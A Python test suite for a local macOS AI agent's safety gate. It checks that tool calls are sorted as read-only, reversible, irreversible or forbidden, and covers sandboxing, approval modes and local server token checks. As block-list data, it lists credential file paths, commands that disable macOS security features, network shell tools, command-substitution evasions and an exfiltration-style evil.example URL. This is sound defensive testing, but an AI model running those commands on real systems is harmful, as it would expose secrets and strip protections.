#!/usr/bin/env python3
"""30Bを起動せずに輪の境界を試す。"""
import json
import io
import importlib.util
import os
import platform
import shutil
import sqlite3
import subprocess
import sys
import tempfile
from types import SimpleNamespace
from pathlib import Path
from unittest import mock

with tempfile.TemporaryDirectory(prefix="jiyuu-test-") as temporary:
    home = Path(temporary) / "home"
    home.mkdir()
    os.environ["HOME"] = str(home)
    os.environ["KERNEL_PROJECT_DIR"] = str(Path(__file__).resolve().parents[2])
    os.environ["KERNEL_KIROKU_DIR"] = str(Path(temporary) / "kiroku")
    os.environ["KERNEL_HIKAE_DIR"] = str(Path(temporary) / "hikae")
    os.environ["KERNEL_JIYUU_ROUTE"] = "試験"
    import jiyuu
    gakushuu_spec = importlib.util.spec_from_file_location("test_kernel_gakushuu", Path(__file__).resolve().parents[1] / "kernel" / "gakushuu.py")
    gakushuu = importlib.util.module_from_spec(gakushuu_spec)
    gakushuu_spec.loader.exec_module(gakushuu)

    checks = 0
    # 判定と SBPL の許可範囲。実行可能な Mac では profile の構文も確認する。
    cases = {
        "open -a Finder": "戻せる",
        "open ~/Documents/note.txt": "戻せる",
        "defaults read -g AppleInterfaceStyle": "見る",
        "osascript -e 'get volume settings'": "見る",
        "osascript -e 'count windows of application \"Finder\"'": "見る",
        "osascript -e 'output volume of (get volume settings)'": "見る",
        "curl -I https://example.org": "戻せない", "wget https://example.org": "戻せない",
        "git clone https://example.org/r.git": "戻せない", "git pull": "戻せない",
        "git push": "戻せない", "git fetch": "戻せない",
        "pip install x": "戻せない", "pip3 install x": "戻せない",
        "brew install x": "戻せない", "npm install x": "戻せない",
        "pnpm install x": "戻せない", "yarn install x": "戻せない",
        "ssh host": "戻せない", "scp a host:/tmp/": "戻せない",
        "rsync a host:/tmp/": "戻せない", "nc host 80": "戻せない",
    }
    for command, expected in cases.items():
        assert jiyuu._risk("sh", {"command": command}) == expected, command
        assert jiyuu.gate._command_risk(command) == expected, command
        assert jiyuu._network_command(command) == (expected == "戻せない"), command
    for risk in ("見る", "戻せる", "戻せない"):
        profile = jiyuu.gate.hako.build_profile(risk)
        assert ("(allow lsopen)" in profile) == (risk != "見る")
        assert ("(allow appleevent-send)" in profile) == (risk != "見る")
        sandbox = shutil.which("sandbox-exec") if platform.system() == "Darwin" else None
        if sandbox:
            checked = subprocess.run([sandbox, "-p", profile, "/usr/bin/true"],
                                     capture_output=True, text=True)
            if checked.returncode and "sandbox_apply: Operation not permitted" not in checked.stderr:
                raise AssertionError(f"{risk} profile を読めません: {checked.stderr}")
    checks += 1
    blocked = jiyuu._job({"command": "curl -sI https://example.org"}, "戻せない", "test")
    assert not blocked["ok"] and "ネットに出られませんでした" in blocked["結果"]
    with mock.patch.object(jiyuu.gate, "_sandbox_command",
                           return_value=subprocess.CompletedProcess([], 0, stdout="ok", stderr="")) as sandbox:
        approved = jiyuu._job({"command": "curl -sI https://example.org"}, "戻せない", "test", approved=True)
        assert approved["ok"] and sandbox.call_args.kwargs["network_approved"] is True
    checks += 1

    # 試験中の open は偽物だけを実行し、実アプリを開かない。
    fake_bin = home / "bin"
    fake_bin.mkdir()
    fake_open = fake_bin / "open"
    fake_open.write_text('#!/bin/sh\nprintf "%s\\n" "$@" >> "$JIYUU_OPEN_LOG"\n')
    fake_open.chmod(0o755)
    (home / ".zprofile").write_text('export PATH="$HOME/bin:$PATH"\n')
    open_log = home / "opened.txt"
    with mock.patch.dict(os.environ, {"PATH": str(fake_bin) + os.pathsep + os.environ.get("PATH", ""),
                                   "JIYUU_OPEN_LOG": str(open_log)}):
        resolved = subprocess.run(["/bin/zsh", "-lc", "command -v open"], capture_output=True, text=True,
                                  env=os.environ.copy(), check=True).stdout.strip()
        assert resolved == str(fake_open), resolved
        opened = subprocess.run(["/bin/zsh", "-lc", "open -a TextEdit"], capture_output=True, text=True,
                                env=os.environ.copy(), check=True)
    assert opened.returncode == 0 and open_log.read_text().splitlines() == ["-a", "TextEdit"]
    checks += 1
    captured = []
    def fake_urlopen(request, timeout):
        captured.append(json.loads(request.data))
        return io.BytesIO(b'{"choices":[{"message":{"content":"ok"}}]}')
    with mock.patch.object(jiyuu.urllib.request, "urlopen", side_effect=fake_urlopen):
        assert jiyuu._ask([{"role": "system", "content": jiyuu.SYSTEM}], thinking=True)["content"] == "ok"
    assert captured[0]["cache_prompt"] is True
    assert captured[0]["tools"] == jiyuu.TOOLS
    assert captured[0]["chat_template_kwargs"]["enable_thinking"] is True
    assert len(captured[0]["tools"]) == 15 and captured[0]["max_tokens"] == 128
    checks += 1
    preview = jiyuu._short({"ok": True, "結果": "A" * 6000}, "long", 1)
    archive = Path(preview.split("全文: ", 1)[1].split(" …", 1)[0])
    assert len(preview) <= 1200 and "A" * 6000 in archive.read_text(encoding="utf-8")
    checks += 1
    def call(tool_name, **args):
        return {"id": "c1", "type": "function", "function": {"name": tool_name, "arguments": json.dumps(args, ensure_ascii=False)}}
    # 空値を捨てた後も sh の command/job は片方だけにする。
    assert jiyuu._valid(call("sh", command="python3 ~/Desktop/hello.py", job="", action=""))[1] == {
        "command": "python3 ~/Desktop/hello.py"}
    assert jiyuu._valid(call("sh", command="", job="work-1"))[1] == {"job": "work-1", "action": "output"}
    assert jiyuu._valid(call("sh", command="pwd", job="work-1", action="stop"))[1] == {"command": "pwd"}
    assert jiyuu._valid(call("sh", job="work-1"))[1] == {"job": "work-1", "action": "output"}
    assert jiyuu._valid(call("sh", command="pwd", job=None, action=None))[1] == {"command": "pwd"}
    checks += 1
    def conversation(calls, mode="自動"):
        replies = iter([{"content": "", "tool_calls": calls}, {"content": "完了"}])
        seen = []
        def ask(messages, thinking=False, final=False):
            seen.append(json.loads(json.dumps(messages)))
            return next(replies)
        with mock.patch.object(jiyuu, "_ask", side_effect=ask):
            assert jiyuu.kotaeru("試験", mode=mode) == "完了"
        return seen

    # 一時 HOME と個人スキルが変わっても、system と道具の接頭辞は同じ。
    snapshots = []
    def capture_prompt(messages, **_kwargs):
        snapshots.append(json.loads(json.dumps(messages)))
        return {"content": "完了"}
    with mock.patch.object(jiyuu, "_ask", side_effect=capture_prompt):
        assert jiyuu.kotaeru("試験") == "完了"
    with mock.patch.dict(os.environ, {"HOME": str(Path(temporary) / "another-home"),
                                   "KERNEL_SKILLS_DIR": str(Path(temporary) / "no-skills")}):
        with mock.patch.object(jiyuu, "_ask", side_effect=capture_prompt):
            assert jiyuu.kotaeru("試験") == "完了"
    first, second = snapshots
    assert first[0] == second[0] == {"role": "system", "content": jiyuu.SYSTEM}
    assert first[-1]["content"] != second[-1]["content"]
    assert str(home) in first[-1]["content"] and "another-home" in second[-1]["content"]
    checks += 1

    # 30Bが一度に多数の呼び出しを壊しても、4件で打ち切り最後の返事へ進む。
    oversized = conversation([call("shiru", query="未学習") for _ in range(20)])
    assert len(oversized) == 2
    assert sum(len(message.get("tool_calls", [])) for message in oversized[1]) == 4
    checks += 1

    target = home / "memo.txt"
    seen = conversation([call("write", path=str(target), content="一行")])
    assert target.read_text() == "一行"
    assert seen[1][-2]["role"] == "assistant" and seen[1][-1]["role"] == "tool"
    checks += 1

    # 指定フォルダを保ち、見つからない時はホームから再探索する手を返す。
    assert "指定場所を使い" in jiyuu._system() and "場所を想像せず" in jiyuu._system()
    assert "findでホーム以下" in jiyuu._system()
    for name, args in (("move", {"src": "~/Documents/meeting.txt", "dst": "~/Desktop/整理"}),
                       ("trash", {"paths": ["~/Downloads/old.tmp"]})):
        result = jiyuu._missing_hint(name, args, {"ok": False, "結果": "見つかりません"})
        assert "find" in result["次"] and "**/" in result["次"]
    checks += 1

    # 仮想Volumesがあればそちらを使い、無ければMacの/Volumesとして解く。
    assert jiyuu._normalize({"dir": "~/Volumes/TestSSD"})["dir"] == "/Volumes/TestSSD"
    ledger = home / "Volumes" / "TestSSD" / "台帳.txt"
    ledger.parent.mkdir(parents=True)
    ledger.write_text("外付け確認")
    assert jiyuu._normalize({"dir": "/Volumes/TestSSD"})["dir"] == str(ledger.parent)
    assert jiyuu._home_resolve("~/Volumes/TestSSD") == ledger.parent
    found = jiyuu._run("find", {"dir": str(ledger.parent), "glob": "台帳.txt"}, "見る", "test")
    assert found["ok"] and ledger.resolve() in [Path(p) for p in found["場所"]]
    checks += 1

    downloads = home / "Downloads"
    documents = home / "Documents"
    downloads.mkdir()
    documents.mkdir()
    old = downloads / "old.tmp"
    old.write_text("不要")
    meeting = documents / "meeting.txt"
    meeting.write_text("締切: 10月15日")
    trashed = jiyuu._run("trash", {"paths": [str(old)]}, "戻せる", "test")
    moved = jiyuu._run("move", {"src": str(meeting), "dst": str(home / "Desktop" / "整理")}, "戻せる", "test")
    assert trashed["ok"] and not old.exists() and (home / ".Trash" / "old.tmp").exists()
    assert moved["ok"] and (home / "Desktop" / "整理" / "meeting.txt").exists()
    try:
        jiyuu._valid(call("move", src="~/Documents/meeting.txt", dst=str(home / " ~/Desktop/整理")))
    except ValueError as error:
        assert "途中に~" in str(error)
    else:
        raise AssertionError("誤った移動先を拒否しませんでした")
    assert jiyuu._label("move", {"src": str(meeting), "dst": str(home / "Desktop" / "整理")}).startswith("移す: ~/Documents/meeting.txt → ~/Desktop/整理")
    assert "ほか2つ" in jiyuu._label("trash", {"paths": [str(old), "b", "c"]})
    checks += 1

    # 以前の呼び方も使え、画面向けイベントには開始・終了と門番の判定が届く。
    events = []
    replies = iter([{"content": "", "tool_calls": [call("read", path="~/Volumes/TestSSD/台帳.txt")]},
                    {"content": "完了"}])
    with mock.patch.object(jiyuu, "_ask", side_effect=lambda *a, **k: next(replies)):
        assert jiyuu.kotaeru("台帳を読む", on_event=events.append) == "完了"
    assert [e["type"] for e in events] == ["tool_start", "tool_end"]
    assert events[0]["id"] == events[1]["id"] == "c1" and events[0]["risk"] == "見る"
    assert events[1]["ok"] is True and "読む:" in events[0]["label"]
    checks += 1

    def broken_event(_event):
        raise RuntimeError("画面の故障")
    replies = iter([{"content": "", "tool_calls": [call("mac", what="時刻")]}, {"content": "完了"}])
    with mock.patch.object(jiyuu, "_ask", side_effect=lambda *a, **k: next(replies)):
        with mock.patch.object(jiyuu, "_run", return_value={"ok": True, "結果": "正午"}):
            assert jiyuu.kotaeru("試験", on_event=broken_event) == "完了"
    checks += 1

    events = []
    duplicate = call("read", path="~/Volumes/TestSSD/台帳.txt")
    duplicate["id"] = "c2"
    replies = iter([{"content": "", "tool_calls": [call("read", path="~/Volumes/TestSSD/台帳.txt"), duplicate]},
                    {"content": "完了"}])
    with mock.patch.object(jiyuu, "_ask", side_effect=lambda *a, **k: next(replies)):
        assert jiyuu.kotaeru("試験", on_event=events.append) == "完了"
    assert any(e["type"] == "note" and "繰り返し" in e["text"] for e in events)
    checks += 1

    events = []
    replies = iter([{"content": "", "tool_calls": [call("write", path="~/denied.txt", content="x")]},
                    {"content": "承認が必要です"}])
    with mock.patch.object(jiyuu, "_ask", side_effect=lambda *a, **k: next(replies)):
        with mock.patch.object(jiyuu, "_kiku", return_value=False):
            assert jiyuu.kotaeru("試験", mode="手動", on_event=events.append) == "承認が必要です"
    assert any(e["type"] == "note" and "承認されなかった" in e["text"] for e in events)
    assert events[-1]["type"] == "tool_end" and events[-1]["ok"] is False
    checks += 1

    with mock.patch.object(jiyuu, "_run") as run:
        seen = conversation([call("sh", command="sudo true")])
        run.assert_not_called()
        assert "禁止" in seen[1][-1]["content"]
    checks += 1
    for command in ("cat ~/.claude/CLAUDE.md", "codex --help", "rm -rf ~/Downloads/old.tmp", "find . -delete"):
        assert jiyuu._risk("sh", {"command": command}) == "禁止"
    checks += 1

    seen = conversation([call("trash", paths=[str(target)])])
    assert not target.exists() and any(p.name.startswith("memo.txt") for p in (home / ".Trash").iterdir())
    checks += 1

    for mode, expected in (("手動", False), ("自動", True), ("バイパス", True)):
        with mock.patch.object(jiyuu, "_kiku", return_value=False) as approve:
            with mock.patch.object(jiyuu, "_run", return_value={"ok": True}) as run:
                conversation([call("write", path=str(home / "mode.txt"), content="x")], mode)
                assert run.called == expected
                assert approve.called == (mode == "手動")
        checks += 1

    # 読むだけでは見る以外を実行せず、承認も求めない。
    with mock.patch.object(jiyuu, "_run") as run, mock.patch.object(jiyuu, "_kiku") as approve:
        seen = conversation([call("write", path=str(home / "readonly.txt"), content="x")], "読むだけ")
        run.assert_not_called()
        approve.assert_not_called()
        assert "読むだけの設定なので、見る以外はしません" in seen[1][-1]["content"]
    with mock.patch.object(jiyuu, "_run", return_value={"ok": True, "結果": "見えました"}) as run:
        conversation([call("read", path=str(home / "memo.txt"))], "読むだけ")
        run.assert_called_once()
    checks += 1

    # 秘密の場所はすべての道具で拒否し、広い find の本文探しでも読まない。
    secret_paths = ("~/.ssh/id_rsa", "~/.gnupg/private-keys-v1.d/x", "~/.aws/credentials",
                    "~/.config/gh/hosts.yml", "~/.netrc", "~/.groq.env", "~/Documents/.env",
                    "~/Documents/auth.json", "~/Documents/credentials.json", "~/Documents/cert.pem",
                    "~/Documents/client.key", "~/Documents/id_ed25519.pub",
                    "~/Library/Keychains/login.keychain-db", "~/Library/Browser/Cookies",
                    "~/Library/Browser/Login Data")
    for path in secret_paths:
        assert jiyuu._risk("read", {"path": path}) == "禁止", path
        assert jiyuu._risk("write", {"path": path, "content": "x"}) == "禁止", path
        assert jiyuu._risk("edit", {"path": path, "old": "x", "new": "y"}) == "禁止", path
        assert jiyuu._risk("find", {"dir": path, "text": "x"}) == "禁止", path
        assert jiyuu._risk("move", {"src": path, "dst": "~/safe"}) == "禁止", path
        assert jiyuu._risk("copy", {"src": path, "dst": "~/safe"}) == "禁止", path
        assert jiyuu._risk("trash", {"paths": [path]}) == "禁止", path
        assert jiyuu._risk("sh", {"command": f"cat '{path}'"}) == "禁止", path
    assert jiyuu._risk("sh", {"command": "security find-generic-password -s test"}) == "禁止"
    (home / ".ssh").mkdir()
    (home / ".ssh" / "note.txt").write_text("SENSITIVE")
    (home / "shortcut").symlink_to(home / ".ssh", target_is_directory=True)
    assert jiyuu._risk("read", {"path": str(home / "shortcut" / "note.txt")}) == "禁止"
    (home / ".gnupg").symlink_to(home, target_is_directory=True)
    assert jiyuu._risk("read", {"path": str(home / ".gnupg" / "visible.txt")}) == "禁止"
    found_secret = home / "credentials-test"
    found_secret.write_text("SENSITIVE")
    visible = home / "visible.txt"
    visible.write_text("SENSITIVE")
    found = jiyuu._run("find", {"dir": str(home), "glob": "*", "text": "SENSITIVE"}, "見る", "test")
    assert len(found["場所"]) == 1 and Path(found["場所"][0]).samefile(visible)
    checks += 1

    # 守りの設定はバイパスでも門番が止め、通常設定は通す。
    guarded = ("defaults write com.apple.screensaver askForPassword -int 0",
               "defaults delete com.apple.loginwindow DisableConsoleAccess",
               "defaults write com.apple.alf globalstate -int 0",
               "defaults write com.apple.security.authorization flag -bool false",
               "defaults write com.apple.LaunchServices LSQuarantine -bool false",
               "defaults write com.apple.SoftwareUpdate AutomaticCheckEnabled -bool false",
               "socketfilterfw --setglobalstate off", "systemsetup -setremotelogin on",
               "tmutil disable", "spctl --master-disable", "csrutil disable", "fdesetup disable")
    for command in guarded:
        assert jiyuu._risk("sh", {"command": command}) == "禁止", command
    for command in ("defaults write com.apple.dock autohide -bool true",
                    "defaults write -g AppleInterfaceStyle Dark", "osascript -e 'set volume output volume 35'"):
        assert jiyuu._risk("sh", {"command": command}) != "禁止", command
    checks += 1

    # 起動時の設定読込で保存済みのバイパスを自動へ戻す。
    sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "kernel"))
    import settings
    settings_path = Path(temporary) / "settings.json"
    settings_path.write_text(json.dumps({"許可モード": "バイパス"}, ensure_ascii=False))
    with mock.patch.object(settings, "PATH", str(settings_path)):
        assert settings.load()["許可モード"] == "自動"
        assert json.loads(settings_path.read_text())["許可モード"] == "自動"
    checks += 1

    # POST はヘッダーの合言葉が必須。Origin/Referer は現在のポートまで一致させる。
    import server
    handler = server.Handler.__new__(server.Handler)
    handler.server = SimpleNamespace(server_address=("127.0.0.1", 9000))
    handler.path = "/settings?t=" + server.TOKEN
    handler.headers = {"Host": "127.0.0.1:9000", "Cookie": "kt=" + server.TOKEN}
    assert handler._ok_token() and not handler._ok_post()
    handler.headers["X-Token"] = server.TOKEN
    assert handler._ok_post()
    for host in ("127.0.0.1", "localhost"):
        handler.headers["Origin"] = f"http://{host}:9000"
        handler.headers["Referer"] = f"http://{host}:9000/"
        assert handler._ok_post()
    for key, value in (("Origin", "http://127.0.0.1:9001"),
                       ("Referer", "http://localhost:9001/"),
                       ("Origin", "http://evil.example:9000")):
        handler.headers[key] = value
        assert not handler._ok_post(), (key, value)
        handler.headers[key] = "http://127.0.0.1:9000/"
    checks += 1

    # 戻せない操作は自動で聞き、バイパスで進める。
    with mock.patch.object(jiyuu, "_risk", return_value="戻せない"):
        for mode, expected in (("自動", False), ("バイパス", True)):
            with mock.patch.object(jiyuu, "_kiku", return_value=False):
                with mock.patch.object(jiyuu, "_run", return_value={"ok": True}) as run:
                    conversation([call("sh", command="open -a TextEdit")], mode)
                    assert run.called == expected
            checks += 1

    bad = {"id": "bad", "type": "function", "function": {"name": "write", "arguments": "{"}}
    seen = conversation([bad])
    assert "形を直して" in seen[1][-1]["content"]
    checks += 1

    # J02: 配列を JSON 文字列にした呼び出しを戻す。削除対象は1件に限り、危険な形は止める。
    victim = home / "Downloads" / "old.tmp"
    victim.parent.mkdir(exist_ok=True)
    victim.write_text("old")
    encoded = call("trash", paths=json.dumps([str(victim)]))
    assert jiyuu._valid(encoded) == ("trash", {"paths": [str(victim)]})
    jiyuu._outbound().request = "old.tmp をゴミ箱へ移して"
    rm = f'rm -f {victim} && echo "削除完了" && ls -la {victim}'
    name, args, note = jiyuu._rewrite_sh("sh", {"command": rm})
    assert name == "trash" and args == {"paths": [str(victim)]} and note
    assert jiyuu._risk(name, args) == "戻せる"
    moved = jiyuu._run(name, args, "戻せる", "test")
    assert moved["ok"] and not victim.exists() and (home / ".Trash" / "old.tmp").exists()
    for unsafe in (f"rm -rf {victim}", f"rm -f {victim} && rm -f {home / 'other'}",
                   f"rm -f {victim} && curl https://example.org"):
        assert jiyuu._rewrite_sh("sh", {"command": unsafe})[0] == "sh"
        assert jiyuu._risk("sh", {"command": unsafe}) == "禁止"
    victim.write_text("again")
    assert jiyuu._rewrite_sh("sh", {"command": f"rm {victim}"})[:2] == ("trash", {"paths": [str(victim)]})
    assert jiyuu._rewrite_sh("sh", {"command": f"rm -f {victim.parent}"})[0] == "sh"   # フォルダは言い換えない
    jiyuu._outbound().request = "中身を見せて"
    assert jiyuu._rewrite_sh("sh", {"command": f"rm -f {victim}"})[0] == "sh"
    jiyuu._outbound().request = "old.tmp はゴミ箱へ移さないで"
    assert jiyuu._rewrite_sh("sh", {"command": f"rm -f {victim}"})[0] == "sh"
    checks += 1

    # J04: mv を move に変え、移動先の親フォルダを作る。上書きはしない。
    src = home / "Documents" / "meeting.txt"
    src.parent.mkdir(exist_ok=True)
    src.write_text("meeting")
    dst = home / "Desktop" / "整理_追加試験" / "meeting.txt"
    name, args, note = jiyuu._rewrite_sh("sh", {"command": f'mv "{src}" "{dst}"'})
    assert name == "move" and args == {"src": str(src), "dst": str(dst)} and not note
    assert jiyuu._risk(name, args) == "戻せる"
    result = jiyuu._run(name, args, "戻せる", "test")
    assert result["ok"] and dst.read_text() == "meeting" and not src.exists()
    src.write_text("second")
    assert not jiyuu._run(name, args, "戻せる", "test")["ok"] and src.read_text() == "second"
    assert jiyuu._rewrite_sh("sh", {"command": f"mv {src} {dst} && echo done"})[0] == "sh"
    assert jiyuu._rewrite_sh("sh", {"command": f"mv {src} {home}/../elsewhere.txt"})[0] == "sh"
    # copy道具と cp の言い換え。元を残し、フォルダは再帰し、既存先は上書きしない。
    copied = home / "Desktop" / "退避" / "深い" / "meeting.txt"
    name, args, note = jiyuu._rewrite_sh("sh", {"command": f'cp -p "{src}" "{copied}"'})
    assert name == "copy" and args == {"src": str(src), "dst": str(copied)} and not note
    assert jiyuu._valid(call("copy", **args)) == ("copy", args)
    assert jiyuu._label("copy", args).startswith("コピー: ")
    assert jiyuu._risk(name, args) == "戻せる"
    result = jiyuu._run(name, args, "戻せる", "test")
    assert result["ok"] and copied.read_text() == "second" and src.read_text() == "second"
    copied.write_text("保護")
    result = jiyuu._run(name, args, "戻せる", "test")
    assert not result["ok"] and copied.read_text() == "保護" and src.read_text() == "second"
    folder = home / "Documents" / "copy-source"
    folder.mkdir()
    (folder / "nested.txt").write_text("nested")
    folder_copy = home / "Desktop" / "folder-copy"
    result = jiyuu._run("copy", {"src": str(folder), "dst": str(folder_copy)}, "戻せる", "test")
    assert result["ok"] and (folder_copy / "nested.txt").read_text() == "nested" and folder.exists()
    existing_dir = home / "Desktop" / "既存フォルダ"
    existing_dir.mkdir()
    result = jiyuu._run("copy", {"src": str(src), "dst": str(existing_dir)}, "戻せる", "test")
    assert result["ok"] and (existing_dir / src.name).read_text() == "second"
    # 10/2 J29: 「元/.」は中身を先へ（cp -R 元/. 先）。先に mkdir した同じ名前の空フォルダも入れ子にしない。
    (folder / "配布").mkdir()
    (folder / "配布" / "手順.txt").write_text("受付")
    inner = home / "Desktop" / "控え" / "初日"
    inner.mkdir(parents=True)
    result = jiyuu._run("copy", {"src": str(folder) + "/.", "dst": str(inner) + "/"}, "戻せる", "test")
    assert result["ok"] and (inner / "nested.txt").read_text() == "nested" and (inner / "配布" / "手順.txt").read_text() == "受付"
    assert not (inner / folder.name).exists() and (folder / "nested.txt").exists()
    again = jiyuu._run("copy", {"src": str(folder) + "/.", "dst": str(inner)}, "戻せる", "test")
    assert not again["ok"] and "上書きしません" in again["結果"]
    same = home / "Desktop" / "控え2" / folder.name
    same.mkdir(parents=True)
    result = jiyuu._run("copy", {"src": str(folder), "dst": str(same)}, "戻せる", "test")
    assert result["ok"] and (same / "配布" / "手順.txt").exists() and not (same / folder.name).exists()
    assert not jiyuu._run("copy", {"src": str(folder) + "/.", "dst": str(folder / "配布")}, "戻せる", "test")["ok"]
    # 10/2 J40: 頼みの場所に無かった時は、そのことも言ってから聞く。
    weekly = [home / "Documents" / "週報.txt", home / "Desktop" / "提出用" / "週報.txt"]
    guard = jiyuu._request_guard("copy", {"src": str(weekly[0]), "dst": str(weekly[1])},
                                 "~/Downloads/週報.txt を ~/Desktop/提出用 にコピーして", [str(p) for p in weekly], "戻せる")
    assert guard.startswith("~/Downloads/週報.txt は見つかりません。候補が複数あります:"), guard
    # 10/2: hyou はファイル群の「項目: 値」を CSV の文にする（全角の ：・数字も直す。列にファイル名も可。読むだけ）。
    shelf = home / "Documents" / "棚札"
    shelf.mkdir(parents=True)
    (shelf / "赤.txt").write_text("品名: 赤ペン\n残数: 0\n必要数: 12\n")
    (shelf / "青.txt").write_text("見出し: 次週\n品名：青ペン\n残数：０\n必要数：５\n")
    name, args = jiyuu._valid(call("hyou", paths=json.dumps([str(shelf / "赤.txt"), str(shelf / "青.txt")]), columns=["品名", "必要数"]))
    assert name == "hyou" and isinstance(args["paths"], list) and jiyuu._risk(name, args) == "見る"
    got = jiyuu._run(name, args, "見る", "test")
    assert got["ok"] and got["結果"] == "品名,必要数\n赤ペン,12\n青ペン,5\n" and "足りない" not in got, got
    got = jiyuu._run("hyou", {"paths": [str(shelf)], "columns": ["ファイル名", "残数", "色"]}, "見る", "test")
    assert got["結果"].splitlines() == ["ファイル名,残数,色", "赤.txt,0,", "青.txt,0,"] and len(got["足りない"]) == 2, got
    assert jiyuu._risk("hyou", {"paths": ["~/.ssh/id_rsa"], "columns": ["a"]}) == "禁止"
    assert not jiyuu._run("hyou", {"paths": [str(shelf / "無い.txt")], "columns": ["品名"]}, "見る", "test")["ok"]
    big = shelf / "大きい.txt"
    big.write_text("品名: 大\n" + "あ" * (jiyuu.gate.READ_ALL_IF_UNDER_CHARS + 10) + "\n")
    assert "全部は読めない" in jiyuu._run("hyou", {"paths": [str(big)], "columns": ["品名"]}, "見る", "test")["結果"]
    linked = home / "Documents" / "リンク入り"
    linked.mkdir()
    (linked / "本体.txt").write_text("本体")
    (linked / "近道").symlink_to(linked / "本体.txt")
    got = jiyuu._run("copy", {"src": str(linked) + "/.", "dst": str(home / "Desktop" / "リンク先")}, "戻せる", "test")
    assert not got["ok"] and "リンク" in got["結果"] and not (home / "Desktop" / "リンク先").exists()
    assert jiyuu._rewrite_sh("sh", {"command": f'cp -R "{folder}" "{home}/Desktop/tree-copy"'})[0] == "copy"
    for command in (f"cp -n {src} {copied}", f"cp {src} {copied} && echo done",
                    f"cp {src} {home}/../elsewhere.txt", f"cp -r {folder} {home}/Desktop/tree-copy; ls"):
        assert jiyuu._rewrite_sh("sh", {"command": command})[0] == "sh", command
    assert jiyuu._risk("copy", {"src": str(Path(os.environ["KERNEL_PROJECT_DIR"])), "dst": str(home / "safe")}) == "禁止"
    missing_dst = home / "Desktop" / "別" / "meeting.txt"
    hint = jiyuu._missing_hint("sh", {"command": f"mv {src} {missing_dst}"},
                               {"ok": False, "結果": "mv: No such file or directory"})
    assert "mkdir -p" in hint["次"] and str(missing_dst.parent) in hint["次"]
    seen_path = str(home / "Downloads" / "old.tmp")
    Path(seen_path).parent.mkdir(exist_ok=True)
    Path(seen_path).write_text("old")
    hint = jiyuu._missing_hint("trash", {"paths": [str(home / "old.tmp")]}, {"ok": False, "結果": "見つかりません: x"}, [seen_path])
    assert seen_path in hint["次"]
    assert jiyuu._command_key({"command": "defaults read com.apple.x -key V"}) == "defaults read"
    checks += 1

    # J08/J11: 確認だけの複合命令を許し、危険な連結・展開は従来通り承認へ回す。
    for command in ('sleep 3; pgrep -a "TextEdit" || echo "TextEdit が見つかりません"',
                    "python3 --version; which python3", "pwd && which python3"):
        assert jiyuu._risk("sh", {"command": command}) == "見る", command
    for command in ("python3 --version; python3 -c 'open(\"x\",\"w\")'",
                    "pwd && touch file", "$(echo rm) -rf ~/x", "sleep 30; pgrep TextEdit", "echo $(reboot)"):
        assert jiyuu._risk("sh", {"command": command}) != "見る", command
    assert jiyuu._risk("sh", {"command": "echo $HOME"}) == "見る"
    assert jiyuu._risk("sh", {"command": 'open -a "TextEdit" /dev/null 2>&1; echo "exit=$?"'}) == "戻せる"
    assert jiyuu._risk("sh", {"command": "X=reboot; $X"}) == "戻せない"
    assert jiyuu._risk("sh", {"command": "echo 中身は $(cat /Volumes/TestSSD/台帳.txt)"}) == "見る"
    assert jiyuu._risk("sh", {"command": "echo $(cat ~/.ssh/id_rsa)"}) == "禁止"
    assert jiyuu._risk("sh", {"command": "echo $(echo $(reboot))"}) == "戻せない"
    assert jiyuu._risk("sh", {"command": "pwd; echo $(whoami)"}) == "見る"   # 中も外も読むだけ
    assert jiyuu._risk("sh", {"command": "ls; `echo cat` x"}) == "戻せない"   # 命令の名前を作る形
    assert jiyuu._risk("sh", {"command": "ls; `echo rm` x"}) in ("戻せない", "禁止")
    checks += 1

    # 試験用の砂箱入口で本物の短いプロセスを起動し、outputとstopを確認。
    fake = Path(temporary) / "sandbox-exec"
    fake.write_text("#!/bin/sh\nshift 2\nexec \"$@\"\n")
    fake.chmod(0o700)
    with mock.patch.object(jiyuu.gate.hako, "_sandbox_executable", return_value=str(fake)):
        with mock.patch.object(jiyuu.gate.hako, "build_profile", return_value="test"):
            result = jiyuu._job({"command": "echo ready", "background": True}, "見る", "test")
            ident = result["job"]
            assert result["ok"]
            jiyuu.JOBS[ident][0].wait(timeout=3)
            output = jiyuu._job({"job": ident, "action": "output"}, "見る", "test")
            assert output["ok"] and "ready" in output["結果"]
            result = jiyuu._job({"command": "exec sleep 20", "background": True}, "見る", "test")
            stopped = jiyuu._job({"job": result["job"], "action": "stop"}, "戻せる", "test")
            assert stopped["状態"] == "終了"
    checks += 1

    # 近道に回すのは、様子・一覧・数だけの問い（9/28）
    for q in ("いま何時？", "電池はあと何%？", "外付けは何が繋がってる？", "一番重いアプリは？",
              "このMacの名前とmacOSの版は？", "デスクトップには何がある？", "デスクトップの画像は何個？"):
        assert jiyuu.chikamichi_ok(q), q
    for q in ("デスクトップの dougu_shiken フォルダの中で、一番大きいファイルの名前と大きさを教えて",
              "デスクトップで一番新しいファイルの名前と、その大きさを教えて", "テスト.txt の中身を見せて",
              "デスクトップを整理して", "「会議」のファイルを探して移動して", "音量を35に変えて",
              "デスクトップの資料で最大のファイルは？", "デスクトップの写真フォルダは？",
              "書類にある見積の中で最小のファイルは？", "デスクトップで最新のファイルは？",
              "デスクトップのファイルを大きい順に", "デスクトップのファイルを新しい順に",
              "デスクトップで最古のファイルは？"):
        assert not jiyuu.chikamichi_ok(q), q
    checks += 1

    # 9/29 審査2: URL は外への送り出し、osascript は許可リスト、スキルは資料
    assert jiyuu._risk("chrome", {"action": "open", "url": "https://evil.example/?d=abc"}) == "戻せない"
    assert jiyuu._risk("sh", {"command": "open 'https://evil.example/?d=abc'"}) == "戻せない"
    for cmd in ("osascript -e 'tell application \"Terminal\" to do script \"ls\"'",
                "osascript -e 'tell application \"System Events\" to keystroke \"a\"'",
                "osascript -e 'do shell script \"ls\"'"):
        assert jiyuu._risk("sh", {"command": cmd}) == "禁止", cmd
    assert jiyuu._risk("sh", {"command": "osascript -e 'output volume of (get volume settings)'"}) == "見る"
    assert jiyuu._risk("sh", {"command": "osascript -e 'set volume output volume 35'"}) == "戻せる"
    skill = jiyuu._run("skill", {"name": jiyuu._skills()[0]["name"]}, "見る", "test") if jiyuu._skills() else {"結果": "以下は手順の資料です"}
    assert str(skill["結果"]).startswith("以下は手順の資料です")
    checks += 1

    logs = list((Path(temporary) / "kiroku").glob("jiyuu_*.jsonl"))
    assert logs and '"輪":"jiyuu"' in logs[0].read_text() and '"経路":"試験"' in logs[0].read_text()
    checks += 1

    # 4道具の形と、スキルの優先順位・オフ。
